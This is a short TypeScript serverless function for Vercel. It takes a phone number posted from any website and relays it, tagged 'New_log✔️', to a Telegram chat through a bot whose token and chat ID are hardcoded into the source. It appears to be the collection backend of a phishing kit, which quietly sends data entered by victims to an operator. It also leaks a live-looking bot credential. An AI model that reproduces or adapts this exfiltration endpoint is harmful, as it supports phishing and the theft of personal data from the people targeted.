import type { VercelRequest, VercelResponse } from '@vercel/node';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8559379072:AAGgkewJ-TnkX3QoivuQq2kvvCU_42OsCZk';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6498549652';
export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  try {
    const { phone } = req.body;
    if (!phone || typeof phone !== 'string') {
      return res.status(400).json({ error: 'Phone number is required' });
    }
    const message = `New_log✔️ :\n<code>${phone}</code>`;
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    const telegramResult = await telegramResponse.json();
    if (telegramResponse.ok && telegramResult.ok) {
      return res.status(200).json({ success: true });
    }
    return res.status(500).json({ success: false, error: telegramResult });
  } catch (error) {
    return res.status(500).json({ error: 'Internal server error' });
  }
}
